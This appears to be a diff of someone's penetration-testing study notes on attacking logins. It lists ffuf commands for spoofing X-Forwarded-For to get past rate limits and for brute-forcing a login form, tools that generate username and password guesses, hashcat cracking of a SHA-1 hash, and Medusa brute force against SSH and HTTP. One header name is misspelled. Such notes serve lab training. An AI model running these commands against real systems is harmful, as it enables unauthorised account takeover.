@@ -1,6 +1,5 @@
 #auth 
 ##### Bypass protection
-
 1. Use header
 ```bash
 for i in {1..10000}; do echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"; done > random_ips.txt
@@ -18,7 +17,6 @@ ffuf -w random_ips.txt:IP -H 'X-Forwareded-For: IP'
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
 ````
 
-[[ffuf]]
 [[Passwords]]
 #### Default passwords:
 - [https://cirt.net/passwords](https://cirt.net/passwords)
@@ -44,12 +42,13 @@ Crunch will now generate the following amount of data: 700 bytes 0 MB 0 GB 0 TB 
 
 
 ### Username anarchy
-```shell
+```bash
 sudo apt install ruby -y
 git clone https://github.com/urbanadventurer/username-anarchy.git
 cd username-anarchy
 
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
+./username-anarchy -i user_names.txt > jane_smith_usernames.txt
 ```
 
 ### CUPP - Common User Passwords Profiler
@@ -60,20 +59,19 @@ sudo apt install cupp -y
 cupp -i
 ```
 
-
-detect hash type
+### [[hashcat]]
+#### detect hash type
 `hashid 8d6e34f987851aa599257d3831a1af040886842f`
 
-dict based attack on sha-1
+#### dict based attack on sha-1
 `hashcat -m 100 -a 0 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt`
-[[hashcat]]
 #### Medusa
 ```shell
  medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
 ```
 
 ```shell-session
-la1n23@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
+medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
 ```
 
  Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
